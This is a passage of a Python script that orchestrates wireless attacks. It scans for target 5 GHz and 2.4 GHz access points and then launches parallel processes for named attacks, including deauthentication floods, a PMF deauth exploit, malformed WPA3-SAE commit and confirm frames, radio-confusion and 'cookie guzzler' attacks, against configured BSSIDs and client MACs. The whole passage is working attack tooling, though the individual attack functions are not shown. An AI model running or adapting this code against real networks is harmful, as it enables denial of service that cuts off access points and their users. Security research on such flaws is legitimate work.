            csv_filename = None
            for i in range(scan_duration):
                files = glob.glob("scan_result*.csv")
                if files:
                    csv_filename = files[0]
                    parsed_info = get_target_info_from_csv(csv_filename, TARGET_STA_MACS + TARGET_STA_MACS_5GHZ_SPECIAL + TARGET_STA_MACS_2_4GHZ_SPECIAL)
                    current_ap_targets = parsed_info['aps']
                    current_client_targets = parsed_info['clients']
                
                status_5g = f"CH {current_ap_targets['5ghz']['channel']}" if current_ap_targets.get('5ghz') else "Searching AP"
                status_2g = f"CH {current_ap_targets['2.4ghz']['channel']}" if current_ap_targets.get('2.4ghz') else "Searching AP"
                clients_status = f"Clients [5G:{len(current_client_targets['5ghz'])}|2.4G:{len(current_client_targets['2.4ghz'])}]"
                sys.stdout.write(f"\r[INFO] Scan: [5G: {status_5g}] [2.4G: {status_2g}] | {clients_status} ({i+1}/{scan_duration}s) ")
                sys.stdout.flush()

                if current_ap_targets.get('5ghz') and current_ap_targets.get('2.4ghz'):
                    print("\n[SUCCESS] Both target APs found!")
                    break
                time.sleep(1)
            
            scanner_proc.terminate()
            if not (current_ap_targets.get('5ghz') and current_ap_targets.get('2.4ghz')):
                 print("\n[WARNING] Not all target APs were found. The script will attempt to proceed with the found targets.")
        else:
            print("[INFO] Manual mode: Using channels from configuration.")
            if MANUELLER_KANAL_5GHZ: current_ap_targets['5ghz'] = {'bssid': TARGET_BSSID_5GHZ, 'channel': MANUELLER_KANAL_5GHZ}
            if MANUELLER_KANAL_2_4GHZ: current_ap_targets['2.4ghz'] = {'bssid': TARGET_BSSID_2_4GHZ, 'channel': MANUELLER_KANAL_2_4GHZ}

        print("\n" + "="*80 + "\n[INFO] Starting attack processes...\n" + "="*80)
        
        ATTACK_FUNCTIONS = {
            "case1_denial_of_internet": run_case1_denial_of_internet_process, "case2_bad_auth_algo_broadcom": run_case2_bad_auth_algo_broadcom_process,
            "case3_bad_status_code": run_case3_bad_status_code_process, "case4_bad_send_confirm": run_case4_bad_send_confirm_process,
            "case5_empty_frame": run_case5_empty_frame_process, "case6_radio_confusion": run_case6_radio_confusion_process,
            "case6_radio_confusion_reverse": run_case6_radio_confusion_reverse_process, "case7_back_to_the_future": run_case7_back_to_the_future_process,
            "case8_bad_auth_algo_qualcomm": run_case8_bad_auth_algo_qualcomm_process, "case9_bad_sequence_number": run_case9_bad_sequence_number_process,
            "case10a_bad_auth_body_empty": run_case10a_bad_auth_body_empty_process, "case10b_bad_auth_body_payload": run_case10b_bad_auth_body_payload_process,
            "case11_seq_status_fuzz": run_case11_seq_status_fuzz_process, "case12_bursty_auth": run_case12_bursty_auth_process,
            "case13_radio_confusion_mediatek": run_case13_radio_confusion_mediatek_process, "case13_radio_confusion_mediatek_reverse": run_case13_radio_confusion_mediatek_reverse_process,
            "deauth_flood": run_deauth_flood_process, "pmf_deauth_exploit": run_pmf_deauth_exploit_process,
            "malformed_msg1_length": run_malformed_msg1_process, "malformed_msg1_flags": run_malformed_msg1_process,
            "bad_algo": run_bad_algo_generic_process, "bad_seq": run_bad_seq_generic_process,
            "bad_status_code": run_bad_status_code_generic_process, "empty_frame_confirm": run_empty_frame_confirm_generic_process,
            "cookie_guzzler": run_cookie_guzzler_process
        }

        for interface, config in ADAPTER_KONFIGURATION.items():
            attack_type = config['angriff']
            band = config.get('band', '5GHz')
            ap_info = current_ap_targets.get('5ghz' if band == '5GHz' else '2.4ghz')
            
            if not ap_info:
                print(f"[WARNING] {interface} ({attack_type}): No target AP found for the {band} band. Skipping.")
                continue

            target_func = ATTACK_FUNCTIONS.get(attack_type)
            if not target_func:
                print(f"[WARNING] {interface}: Attack '{attack_type}' is unknown.")
                continue

            # SMART PARAMETER SELECTION
            # Default: Use parameters of the adapter's band
            scalar_to_use = SAE_SCALAR_5_HEX if band == '5GHz' else SAE_SCALAR_2_4_HEX
            finite_to_use = SAE_FINITE_5_HEX if band == '5GHz' else SAE_FINITE_2_4_HEX

            # Special Cases: Radio Confusion attacks (Case 6 / 13)
            # Logic: If I am on 2.4GHz attacking 5GHz, I need 5GHz params.
            # case6_radio_confusion: Adapter 2.4G -> Target 5G. Needs 5G Params.
            if attack_type == "case6_radio_confusion":
                scalar_to_use = SAE_SCALAR_5_HEX
                finite_to_use = SAE_FINITE_5_HEX
            # case6_radio_confusion_reverse: Adapter 5G -> Target 2.4G. Needs 2.4G Params.
            elif attack_type == "case6_radio_confusion_reverse":
                scalar_to_use = SAE_SCALAR_2_4_HEX
                finite_to_use = SAE_FINITE_2_4_HEX
            # case13_radio_confusion_mediatek: Adapter 5G -> Target 2.4G. Needs 2.4G Params.
            elif attack_type == "case13_radio_confusion_mediatek":
                scalar_to_use = SAE_SCALAR_2_4_HEX
                finite_to_use = SAE_FINITE_2_4_HEX
            # case13_radio_confusion_mediatek_reverse: Adapter 2.4G -> Target 5G. Needs 5G Params.
            elif attack_type == "case13_radio_confusion_mediatek_reverse":
                scalar_to_use = SAE_SCALAR_5_HEX
                finite_to_use = SAE_FINITE_5_HEX

            kwargs = { 
                'bssid': ap_info['bssid'], 
                'channel': ap_info['channel'], 
                'scalar_hex': scalar_to_use, 
                'finite_hex': finite_to_use, 
                'attack_type': attack_type, 
                'clients': [] 
            }
            
            # Pass all BSSID/Channel info for cross-band attacks
            kwargs['bssid_5ghz'] = current_ap_targets.get('5ghz', {}).get('bssid')
            kwargs['channel_5ghz'] = current_ap_targets.get('5ghz', {}).get('channel')
            kwargs['bssid_2_4ghz'] = current_ap_targets.get('2.4ghz', {}).get('bssid')
            kwargs['channel_2_4ghz'] = current_ap_targets.get('2.4ghz', {}).get('channel')

            # Client Selection Logic
            if attack_type in ["case6_radio_confusion", "case13_radio_confusion_mediatek_reverse"]: kwargs['clients'] = TARGET_STA_MACS_5GHZ_SPECIAL
            elif attack_type in ["case6_radio_confusion_reverse", "case13_radio_confusion_mediatek"]: kwargs['clients'] = TARGET_STA_MACS_2_4GHZ_SPECIAL
            elif attack_type not in ["case2_bad_auth_algo_broadcom", "bad_algo", "bad_seq", "bad_status_code", "empty_frame_confirm", "cookie_guzzler"]:
                kwargs['clients'] = TARGET_STA_MACS

            needs_clients = "clients" in kwargs and attack_type not in ["case2_bad_auth_algo_broadcom", "bad_algo", "bad_seq", "bad_status_code", "empty_frame_confirm", "cookie_guzzler"]
            if needs_clients and not kwargs['clients']:
                if SCANNER_INTERFACE:
                    found_clients = current_client_targets['5ghz'] if band == '5GHz' else current_client_targets['2.4ghz']
                    if not found_clients:
                        print(f"[WARNING] {interface} ({attack_type}): Requires clients, but scanner found none.")
                        continue
                    kwargs['clients'] = found_clients
                else: 
                    print(f"[WARNING] {interface} ({attack_type}): Requires clients, but none assigned in manual mode.")
                    continue
            
            print(f"[START] {interface} ({band}): {attack_type} -> BSSID: {kwargs['bssid']}, Channel: {kwargs['channel']}")
            p = Process(target=target_func, args=(interface, counters[interface]), kwargs=kwargs)
            p.start()
            procs[interface] = p

        if not any(isinstance(p, Process) for p in procs.values()):
            sys.exit("\n[ERROR] No attack processes could be started (missing targets?).")

        print("\n" + "="*80 + f"\n[INFO] {len([p for p in procs.values() if isinstance(p, Process)])} attack processes started. Press Ctrl+C to stop.\n" + "="*80)
        
        while any(p.is_alive() for p in procs.values() if isinstance(p, Process)):
            status_line = " | ".join([f"{iface}: {counters[iface].value}" for iface in ADAPTER_KONFIGURATION if interface in procs])
            sys.stdout.write(f"\r[COUNTER] {status_line} ")
            sys.stdout.flush()
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[INFO] User cancellation detected.")
    finally:
        cleanup(procs)

if __name__ == "__main__":
    main()
